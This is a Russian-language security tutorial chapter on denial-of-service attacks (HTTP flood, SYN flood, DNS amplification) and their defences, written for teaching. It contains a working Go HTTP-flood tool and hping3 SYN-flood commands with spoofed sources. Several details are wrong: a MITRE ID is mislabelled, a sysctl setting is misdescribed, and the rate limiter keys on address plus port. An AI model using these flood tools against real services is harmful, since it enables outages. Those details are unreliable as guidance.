# 🛡️ Глава 1: Атаки на Доступность — От HTTP-флуда до SYN-шторма

## Часть 1: DDoS на уровне приложений (L7) — HTTP-флуд

### 🎯 Конкретный инцидент

Твой финтех-стартап запустился три месяца назад. Сегодня Чёрная пятница. Ты сидишь с кофе, смотришь на графики в Grafana — всё ровно, запросов около 200 в секунду. Вдруг график улетает в потолок: 2000, 5000, 15000 запросов в секунду. Процессор микросервиса на Go утыкается в 100%. База данных захлёбывается. Клиенты начинают писать в поддержку: «Почему не проходит оплата?»

Ты открываешь логи и видишь миллионы запросов к эндпоинту `/api/search?q=aaaaaaaaaaaa...` с разных IP. Это HTTP-флуд — простейшая, но разрушительная атака на доступность. Никакой уязвимости в коде нет. Хакер просто использует твой легитимный функционал против тебя.

*(HTTP Flood — атака уровня приложений (L7 по модели OSI), при которой злоумышленник отправляет множество легитимных HTTP-запросов к целевому серверу. Цель — истощить ресурсы сервера: CPU, память, соединения с БД. Относится к классу volumetric DDoS, MITRE ATT&CK T1498.002 — Reflection Amplification.)*

Почему эта атака работает? Давай разбираться по шагам.

---

### 🧠 Как работает HTTP-флуд: цепочка рассуждений

**Вопрос 1: Почему обычные HTTP-запросы могут положить сервер?**

Представь, что твой сервер — это ресторан с одним официантом. В обычный день приходит 20 посетителей в час. Официант успевает принять заказ, отнести на кухню, принести блюдо. Все довольны.

Теперь представь, что в ресторан одновременно врывается 500 человек. Они все кричат «Обслужите меня!», занимают столики, но ничего не заказывают — просто сидят и ждут. Настоящие клиенты не могут войти. Официант мечется между столиками и падает без сил. Это и есть HTTP-флуд.

**Вопрос 2: Что именно истощается на сервере?**

У атаки три цели:
1. **CPU:** Обработка каждого запроса требует процессорного времени. JSON-парсинг, маршрутизация, middleware — всё это стоит тактов.
2. **Память:** Каждый запрос создаёт горутину, аллоцирует память под тело запроса, под структуры. 10 000 одновременных запросов × 1 МБ на буфер = 10 ГБ памяти.
3. **Соединения с БД:** Если эндпоинт ходит в базу (а `/api/search` точно ходит), то каждый запрос занимает одно соединение из пула. Пул истощается — легитимные запросы ждут.

**Вопрос 3: Хакеру же нужно много трафика? Один хакер не сможет положить сервер?**

Один ноутбук — нет. Но хакер использует ботнет — сеть из тысяч заражённых компьютеров, камер, роутеров. Каждое устройство отправляет по 10-20 запросов в секунду. Суммарно это 100 000+ RPS. Такой трафик может положить даже крупный сервер.

Но есть нюанс: хакеру не обязательно иметь ботнет. Он может найти «тяжёлый» эндпоинт — запрос, который требует много ресурсов. Например:
- Поиск по таблице без индекса (один запрос загружает всю БД)
- Генерация PDF-отчёта на лету
- Ресайз изображения с высоким разрешением

Тогда даже 50-100 запросов в секунду от одного хоста могут положить сервер. Это называется **slow-rate DDoS** — атака не объёмом, а сложностью запросов.

### 💻 Пишем HTTP-флуд на Go (Red Team)

**⚠️ Дисклеймер:** Этот код — исключительно для стресс-тестирования **вашего собственного** приложения в изолированной среде. Запуск против чужих систем без письменного разрешения — уголовное преступление (ст. 272 УК РФ, Computer Fraud and Abuse Act в США).

```go
package main

import (
    "fmt"
    "net/http"
    "sync"
    "time"
)

func main() {
    targetURL := "http://localhost:8080/api/search?q=test"
    workers := 100           // Количество горутин-воркеров
    duration := 30 * time.Second
    var wg sync.WaitGroup

    fmt.Printf("Starting HTTP flood: target=%s, workers=%d, duration=%s\n",
        targetURL, workers, duration)

    for i := 0; i < workers; i++ {
        wg.Add(1)
        go func(id int) {
            defer wg.Done()
            client := &http.Client{
                Timeout: 5 * time.Second,
            }
            start := time.Now()
            for time.Since(start) < duration {
                resp, err := client.Get(targetURL)
                if err != nil {
                    fmt.Printf("Worker %d: error: %v\n", id, err)
                    continue
                }
                fmt.Printf("Worker %d: status %s\n", id, resp.Status)
                resp.Body.Close()
            }
        }(i)
    }
    wg.Wait()
    fmt.Println("Flood finished")
}
```

**Разбор кода:**
- **100 горутин** — 100 одновременных «пользователей», каждый шлёт запросы без паузы
- **`http.Client{Timeout: 5s}`** — чтобы воркер не зависал навсегда, если сервер перестал отвечать
- **`resp.Body.Close()`** — обязательно! Без этого соединения не возвращаются в пул, и хакер сам устроит себе утечку соединений
- **Бесконечный цикл** — воркер шлёт запросы, пока не истечёт `duration`

**Что видит жертва:**
- Резкий рост latency
- 502/503/504 ошибки от Nginx/балансировщика
- Падение БД: `too many connections`
- OOM kill процесса Go

### 🛡️ Защита: Rate Limiting на Go (Blue Team)

У нас есть три рубежа обороны против HTTP-флуда. Выстраиваем их от кода к инфраструктуре.

#### Рубеж 1: Rate Limiting в коде приложения

Это твой главный щит. Он работает на уровне твоего Go-микросервиса и защищает от атак, которые прошли мимо внешних балансировщиков.

**Token Bucket — самый популярный алгоритм**

*(Token Bucket — алгоритм ограничения скорости: в «ведро» с фиксированной скоростью добавляются токены. Каждый запрос забирает один токен. Если токенов нет — запрос отклоняется. Позволяет короткие всплески (burst) в пределах ёмкости ведра.)*

Метафора: представь ведро с дыркой. Вода (токены) капает в ведро с постоянной скоростью. Когда приходит запрос, он забирает одну каплю. Если ведро пустое — запрос отклоняется. Размер ведра определяет допустимый всплеск: если ведро на 10 литров, а вода капает по 1 литру в секунду, то можно обработать всплеск в 10 запросов мгновенно, но потом ждать пополнения.

**Реализация на Go через `golang.org/x/time/rate`:**

```go
package main

import (
    "log"
    "net/http"
    "sync"
    "golang.org/x/time/rate"
)

// PerIPRateLimiter хранит лимитеры для каждого IP
type PerIPRateLimiter struct {
    mu       sync.RWMutex
    limiters map[string]*rate.Limiter
    rate     rate.Limit
    burst    int
}

func NewPerIPRateLimiter(r rate.Limit, burst int) *PerIPRateLimiter {
    return &PerIPRateLimiter{
        limiters: make(map[string]*rate.Limiter),
        rate:     r,
        burst:    burst,
    }
}

// GetLimiter возвращает лимитер для IP или создаёт новый
func (l *PerIPRateLimiter) GetLimiter(ip string) *rate.Limiter {
    l.mu.Lock()
    defer l.mu.Unlock()

    limiter, exists := l.limiters[ip]
    if !exists {
        limiter = rate.NewLimiter(l.rate, l.burst)
        l.limiters[ip] = limiter
    }
    return limiter
}

// RateLimitMiddleware — middleware для ограничения запросов
func RateLimitMiddleware(limiter *PerIPRateLimiter) func(http.Handler) http.Handler {
    return func(next http.Handler) http.Handler {
        return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
            ip := r.RemoteAddr
            l := limiter.GetLimiter(ip)

            if !l.Allow() {
                http.Error(w, `{"error": "Too Many Requests"}`, http.StatusTooManyRequests)
                return
            }
            next.ServeHTTP(w, r)
        })
    }
}

func main() {
    // 10 запросов в секунду, всплеск до 20
    limiter := NewPerIPRateLimiter(10, 20)

    mux := http.NewServeMux()
    mux.HandleFunc("/api/search", func(w http.ResponseWriter, r *http.Request) {
        w.Write([]byte(`{"result": "ok"}`))
    })

    handler := RateLimitMiddleware(limiter)(mux)
    log.Fatal(http.ListenAndServe(":8080", handler))
}
```

**Разбор ключевых моментов:**

1. **`PerIPRateLimiter`** — хранит отдельный лимитер для каждого IP. Это важно: нельзя глобально ограничить весь сервер, иначе один легитимный пользователь заберёт все токены.

2. **`rate.NewLimiter(10, 20)`** — 10 запросов в секунду (скорость пополнения), burst до 20 (ёмкость ведра). Это значит: клиент может сделать 20 запросов мгновенно, но потом не больше 10 в секунду.

3. **`l.Allow()`** — атомарно проверяет, есть ли токен. Если нет — возвращает false, мы отдаём 429.

4. **Очистка старых IP:** В продакшене нужно добавить goroutine, которая периодически чистит `limiters` от IP, которые давно не делали запросов. Иначе map будет расти бесконечно и утечёт память.

#### Рубеж 2: Оптимизация тяжёлых эндпоинтов

Rate limiting — это хорошо, но что если легитимный пользователь реально делает поиск? Мы должны сделать так, чтобы один запрос не стоил нам трёх ядер процессора.

- **Кеширование (Redis):** Если запрос `/api/search?q=iphone` выполняется часто, кешируй результат на 5 минут. Хакерский флуд будет бить по кешу, а не по БД.
- **Пагинация:** Никогда не возвращай `SELECT * FROM products` без `LIMIT`. Один запрос на 10 миллионов строк убьёт БД.
- **Асинхронные задачи:** Генерация отчёта — не в обработчике HTTP. Обработчик ставит задачу в очередь (NATS, RabbitMQ), возвращает `task_id`, а клиент polling'ом проверяет готовность.

---

#### Рубеж 3: Внешняя защита (CDN/WAF)

Твой Go-сервис — не первый, кто видит трафик. Перед ним должен быть балансировщик или CDN (Cloudflare, AWS Shield, CloudFront).

- **Cloudflare:** Бесплатный план уже включает защиту от DDoS L3/L4 и базовую — от L7
- **AWS WAF + Shield:** Shield Advanced даёт финансовую гарантию — если DDoS положит сервер, AWS заплатит штраф
- **Nginx `limit_req`:** Защита на уровне обратного прокси, до того как запрос дойдёт до Go

```nginx
limit_req_zone $binary_remote_addr zone=api:10m rate=10r/s;

location /api/ {
    limit_req zone=api burst=20 nodelay;
    proxy_pass http://go_backend;
}
```

### 📝 Что мы узнали?
- HTTP-флуд атакует **Доступность**, используя легитимные запросы к тяжёлым эндпоинтам
- Атака истощает CPU, память и соединения с БД
- Главный щит — **Rate Limiting** с алгоритмом Token Bucket
- Три рубежа защиты: код (middleware), оптимизация эндпоинтов, внешний CDN/WAF

### 💥 Типичные ошибки
- **Ошибка:** «Я защитился Cloudflare, мне не нужен rate limiting в коде»
    - **Правда:** Cloudflare защищает от внешних атак. Внутренний злоумышленник (или просто баг в другом микросервисе) может положить сервер изнутри. Rate limiting в коде — defence in depth.
- **Ошибка:** Использовать `http.DefaultClient` в стресс-тестере
    - **Правда:** `DefaultClient` не имеет таймаута. Если сервер зависнет, воркеры зависнут навсегда. Всегда задавай `Timeout`.
- **Ошибка:** Забыть про `resp.Body.Close()` в flood-клиенте
    - **Правда:** Без закрытия тела соединение не вернётся в пул. Твой собственный флудер начнёт умирать от нехватки соединений.

### 🔁 Для быстрого повторения
- **HTTP Flood:** L7-атака, истощает CPU/память/соединения через легитимные запросы
- **Token Bucket:** алгоритм rate limiting'а — скорость пополнения + burst
- **Go-реализация:** `golang.org/x/time/rate`, middleware с `PerIPRateLimiter`
- **429 Too Many Requests:** стандартный HTTP-статус при превышении лимита
- **Defence in depth:** защита на уровне кода + CDN/WAF + оптимизация эндпоинтов

## Часть 2: DDoS на транспортном уровне (L4) — SYN-флуд

### 🎯 Конкретный инцидент

Твой сервер накрылся. Но Grafana показывает, что CPU в норме, память в норме, запросов к Go — ноль. При этом клиенты жалуются: «Сайт не открывается». Ты заходишь по SSH, делаешь `netstat -an | grep SYN` и видишь:

```
tcp  0  0 0.0.0.0:80   0.0.0.0:*   LISTEN
tcp  0  0 10.0.1.5:80  203.0.113.5:45678  SYN_RECV
tcp  0  0 10.0.1.5:80  203.0.113.7:12345  SYN_RECV
tcp  0  0 10.0.1.5:80  203.0.113.9:54321  SYN_RECV
... (тысячи таких)
```

Твой Go-сервис даже не видит этих запросов. Они умирают на уровне ядра ОС. Это SYN-флуд.

*(SYN Flood — атака транспортного уровня (L4), эксплуатирующая трёхстороннее рукопожатие TCP. Злоумышленник отправляет лавину TCP SYN-пакетов, часто с поддельных IP. Сервер на каждый SYN выделяет запись в очереди backlog и отвечает SYN-ACK, ожидая ACK. ACK никогда не приходит, очередь переполняется, легитимные соединения не устанавливаются. MITRE ATT&CK T1498.001 — Direct Network Flood.)*

---

### 🧠 Как работает SYN-флуд: цепочка рассуждений

**Вопрос 1: Почему SYN-флуд страшнее HTTP-флуда?**

Потому что он работает **ниже** твоего кода. HTTP-флуд можно отфильтровать в middleware, заблокировать IP на уровне приложения. SYN-флуд происходит на этапе установки TCP-соединения — до того, как твой Go-процесс вообще узнает о подключении.

**Вопрос 2: Почему нельзя просто игнорировать «плохие» SYN?**

Давай вспомним, как работает TCP-рукопожатие:

1. Клиент: `SYN` → Сервер (seq=x)
2. Сервер: `SYN-ACK` → Клиент (seq=y, ack=x+1)
3. Клиент: `ACK` → Сервер (ack=y+1)

Между шагами 2 и 3 сервер держит полуоткрытое соединение в **backlog queue** (очереди ожидания). Эта очередь конечна — обычно 128-1024 записи. Каждая запись занимает память. Сервер ждёт ACK от клиента несколько секунд.

Хакер отправляет тысячи SYN в секунду — и все с поддельных IP. Сервер честно отвечает SYN-ACK на несуществующие адреса. Ждёт. Очередь забивается. Новые легитимные SYN не могут поместиться в очередь и отбрасываются.

**Вопрос 3: А что, если просто увеличить очередь?**

Это помогает, но не решает проблему. Хакер просто увеличит поток SYN-пакетов. Кроме того, большая очередь — больше памяти. При миллионах SYN-пакетов в секунду никакая очередь не спасёт.

### 🛠️ Запускаем SYN-флуд (Red Team)

SYN-флуд нельзя сделать на чистом Go. Go работает на уровне приложения, а SYN-пакеты — это уровень ядра. Нужен raw socket (SOCK_RAW), который в Linux требует `root` и не очень удобен в Go. Поэтому используем `hping3`:

```bash
# SYN-флуд к порту 80, случайные source IP (подделка)
sudo hping3 -S --flood -p 80 --rand-source target.com

# Более точный контроль: 1000 пакетов в секунду
sudo hping3 -S -p 80 --faster --rand-source -i u1000 target.com
```

**Разбор флагов:**
- `-S` — отправлять SYN-пакеты
- `--flood` — слать без остановки, не ждать ответов
- `--rand-source` — подделывать source IP (чтобы сервер не мог нас заблокировать)
- `-p 80` — целевой порт
- `-i u1000` — интервал 1000 микросекунд (1 мс) между пакетами = 1000 пакетов/сек

### 🛡️ Защита от SYN-флуда (Blue Team)

Здесь защита смещается из кода в систему. Твой Go-код бессилен.

#### SYN Cookies — главный механизм

*(SYN Cookies — техника, при которой сервер не хранит состояние полуоткрытых соединений в backlog. Вместо этого информация о SYN-пакете (IP, порты, sequence number, timestamp) кодируется криптографически в sequence number ответного SYN-ACK. Когда приходит ACK, сервер декодирует sequence number, проверяет подпись — и только тогда создаёт соединение. Не требует памяти до завершения рукопожатия.)*

Метафора: вместо того чтобы записывать имя каждого гостя в журнал (и расходовать бумагу), охранник выдаёт каждому гостю карточку с зашифрованной информацией. Когда гость возвращается с карточкой, охранник расшифровывает её, убеждается, что это настоящая карточка, и пропускает. Подделать карточку без знания секрета нельзя.

**Включаем SYN Cookies в Linux:**
```bash
# Проверить текущее состояние
sysctl net.ipv4.tcp_syncookies
# 0 = выключено, 1 = включается при переполнении, 2 = всегда включено

# Включить всегда
sudo sysctl -w net.ipv4.tcp_syncookies=1

# Чтобы сохранилось после перезагрузки
echo "net.ipv4.tcp_syncookies = 1" | sudo tee -a /etc/sysctl.conf
```

**Как это работает на практике:**
1. Приходит SYN — сервер **не выделяет** запись в backlog
2. Сервер вычисляет `seq` для SYN-ACK по формуле: `hash(secret, src_ip, src_port, dst_ip, dst_port, timestamp)`
3. Отправляет SYN-ACK с этим `seq`
4. Когда приходит ACK с `ack = seq+1`, сервер проверяет: `seq-1 == hash(...)`?
5. Если да — создаёт соединение. Если нет — игнорирует.

Хакер не может завершить рукопожатие, потому что не знает секрет для вычисления правильного `ack`.

#### Другие меры защиты

- **Увеличение backlog (временно):** `sysctl -w net.ipv4.tcp_max_syn_backlog=4096`
- **Сокращение таймаута SYN_RECV:** `sysctl -w net.ipv4.tcp_syn_retries=3` (по умолчанию 5-6)
- **Spoofed IP фильтрация (ISP-level):** Твой провайдер или облачный провайдер (AWS, GCP) могут отбрасывать пакеты с явно поддельными source IP на границе сети
- **Anycast + scrubbing centres:** Cloudflare, AWS Shield — огромные сети, которые могут поглотить трафик и отфильтровать SYN-флуд до того, как он дойдёт до твоего origin-сервера

### 📝 Что мы узнали?
- SYN-флуд атакует на транспортном уровне (L4), эксплуатируя TCP handshake
- Сервер выделяет память под полуоткрытые соединения в очереди backlog
- SYN Cookies решают проблему в корне — не хранят состояние до завершения рукопожатия
- Защита от SYN-флуда — на уровне ОС и сетевой инфраструктуры, не в коде приложения

### 💥 Типичные ошибки
- **Ошибка:** Пытаться отфильтровать SYN-флуд в коде Go
    - **Правда:** Твой код даже не получает эти соединения. Они умирают на уровне ядра. Rate limiting в коде бесполезен против SYN-флуда.
- **Ошибка:** Думать, что SYN Cookies решают все проблемы
    - **Правда:** SYN Cookies защищают backlog, но не спасают от полного насыщения канала. Если хакер гонит 10 Гбит/с SYN-пакетов, твой канал просто забьётся. Нужна внешняя фильтрация (ISP/Cloud).
- **Ошибка:** Не включать SYN Cookies, потому что «они ломают некоторые TCP-опции»
    - **Правда:** Да, SYN Cookies не сохраняют TCP-опции (window scaling, SACK). Но это лучше, чем сервер вообще не отвечает. В современных ядрах (Linux 4.x+) SYN Cookies работают с TCP-опциями через timestamp-расширение.

### 🔁 Для быстрого повторения
- **SYN Flood:** L4-атака, переполнение backlog очереди полуоткрытых соединений
- **SYN Cookies:** криптографическое кодирование состояния в seq number, защита backlog
- **Защита:** `sysctl tcp_syncookies=1`, ISP scrubbing, Anycast networks
- **Go-разработчик:** твой код не видит SYN-флуд, защита на уровне инфраструктуры

## Часть 3: DNS Amplification — когда хакер использует чужие серверы

### 🎯 Конкретный инцидент

Ты защитился от HTTP-флуда (rate limiting) и SYN-флуда (SYN Cookies). Всё работает. Но однажды утром твой дата-центр сообщает: «Мы заблокировали ваш сервер — с него идёт 40 Гбит/с входящего трафика, наш upstream не справляется».

Ты смотришь логи: 40 Гбит/с DNS-ответов. Но у тебя нет DNS-сервера. Что происходит?

*(DNS Amplification — атака усиления (reflection/amplification). Хакер отправляет DNS-запросы с поддельным source IP (IP жертвы) на открытые DNS-резолверы. Маленький запрос (60 байт) порождает большой ответ (4000+ байт) — коэффициент усиления до 70x. Трафик со всего мира сливается на IP жертвы. MITRE ATT&CK T1498.002 — Reflection Amplification.)*

---

### 🧠 Механика атаки: цепочка рассуждений

**Вопрос 1: При чём здесь DNS?**

DNS — это телефонная книга интернета. Ты спрашиваешь: «Какой IP у google.com?» — DNS-сервер отвечает. Но есть запросы, ответ на которые **гораздо больше** вопроса:

- `ANY` запрос: «Дай мне все записи для этого домена»
- DNSSEC-записи: криптографические подписи могут быть огромными

Пример: 60-байтовый запрос → 4000-байтовый ответ. Усиление в 65 раз.

**Вопрос 2: Как хакер направляет этот трафик на жертву?**

Хакер подделывает source IP в DNS-запросе. Он пишет: «Отправитель: IP жертвы». DNS-сервер честно отправляет ответ на IP жертвы. Так хакер с одного своего сервера генерирует 65x трафика в сторону цели.

**Вопрос 3: А разве DNS-серверы не должны проверять source IP?**

Должны. Но в интернете до сих пор миллионы **открытых DNS-резолверов** — серверов, которые отвечают на запросы от кого угодно. Их неправильно настроили админы. Хакер сканирует интернет, находит их и использует как усилители.

---

### 🛡️ Защита от amplification-атак

Как конечная цель (веб-сервер), ты мало что можешь сделать. Трафик уже пришёл в твой дата-центр.

- **Защита на уровне провайдера:** Твой ISP/Cloud provider должен отбрасывать этот трафик на границе. AWS Shield, Cloudflare Magic Transit — платные сервисы, которые это делают.
- **Не будь частью проблемы:** Если ты администрируешь DNS-сервер — закрой его. Ограничь рекурсию только доверенными IP. Используй Response Rate Limiting (RRL).

---

### 📝 Что мы узнали?
- Amplification-атаки используют легитимные сервисы как усилители
- DNS Amplification даёт коэффициент усиления до 70x
- Защита — на уровне провайдера (scrubbing centres)
- Как админ DNS — закрой открытый резолвер

### 🔁 Для быстрого повторения
- **Amplification:** маленький запрос → большой ответ → усиление трафика
- **Reflection:** поддельный source IP → ответы идут на жертву
- **DNS Amplification:** `ANY` запросы, DNSSEC, до 70x усиления
- **Защита:** ISP scrubbing, закрытие открытых резолверов

### ✅ Ответы на вопросы для самопроверки

1.  **HTTP-флуд** — L7 (Application), истощает CPU/память/соединения БД через обработку легитимных HTTP-запросов. Сервер видит эти запросы в логах. **SYN-флуд** — L4 (Transport), истощает backlog очередь TCP-соединений в ядре ОС. Сервер даже не доходит до обработки HTTP — соединение зависает в состоянии SYN_RECV.

2.  **Rate limiting в коде** — это первый рубеж. Недостаточно. Нужны: (1) оптимизация тяжёлых эндпоинтов (кеш, пагинация, асинхронные задачи), (2) внешняя защита на уровне CDN/WAF (Cloudflare, AWS Shield), (3) мониторинг и алертинг (Grafana + Prometheus) для раннего обнаружения.

3.  **Token Bucket:** ведро пополняется токенами с постоянной скоростью (`rate`), максимальная ёмкость ведра — `burst`. Запрос забирает один токен. Если токенов нет — запрос отклоняется. Burst важен: легитимный пользователь может открыть страницу, которая делает 5 параллельных API-запросов — burst позволяет обработать этот всплеск без ошибок.

4.  **SYN Cookies:** сервер не хранит полуоткрытые соединения в памяти. Вместо этого кодирует информацию о SYN-пакете в sequence number ответного SYN-ACK (криптографический хеш). При получении ACK декодирует и проверяет подпись. **Проблема:** защищает backlog, не защищает от насыщения канала. **Цена:** теряются TCP-опции (window scaling, SACK), хотя в современных ядрах это частично решено через timestamp-расширение.

5.  **SYN-флуд происходит на уровне ядра ОС**, до того как соединение передаётся приложению. Go-процесс получает уже установленное TCP-соединение через accept(). При SYN-флуде очередь переполняется до accept(), Go даже не видит этих запросов. Защита — `tcp_syncookies`, настройки ядра, внешний scrubbing.

6.  **Нет, реальный IP хакера не виден в логах жертвы.** Хакер подделывает source IP в DNS-запросах — они приходят с IP жертвы. DNS-серверы отправляют ответы на жертву. Жертва видит только IP DNS-резолверов. Отследить хакера можно только по логам DNS-серверов, если они сохраняются (что редко).

7.  **SYN-флуд.** CPU низкий (запросы не обрабатываются), входящий трафик максимальный (лавина SYN-пакетов), исходящий — SYN-ACK ответы. При HTTP-флуде CPU был бы высоким (обработка запросов), а трафик — более равномерным в обе стороны.

8.  `resp.Body.Close()` возвращает TCP-соединение в пул keep-alive. **Без него:** соединение висит открытым, пока не истечёт таймаут. При 100 горутинах × 1000 запросов каждая — быстро кончатся доступные ephemeral порты или file descriptors. Клиент сам начнёт получать ошибки «can't assign requested address».

9.  **Решение:** вынести генерацию PDF из обработчика HTTP. Обработчик принимает запрос → создаёт задачу в очереди (NATS, Redis) → возвращает `task_id: "abc-123"`. Клиент polling'ит `GET /api/report/status/abc-123` → получает готовый PDF. Это изолирует тяжёлую работу от HTTP-обработчика и позволяет rate-limit'ить именно статус-эндпоинт (лёгкий).

10. **Метрики для Grafana:**
    - `http_requests_total` (rate) — резкий рост числа запросов
    - `http_request_duration_seconds` (p95/p99) — рост задержек
    - `go_goroutines` — количество горутин (при HTTP-флуде растёт)
    - `node_network_receive_bytes_total` — входящий сетевой трафик (SYN-флуд)
    - `pg_stat_database_numbackends` — количество соединений с PostgreSQL
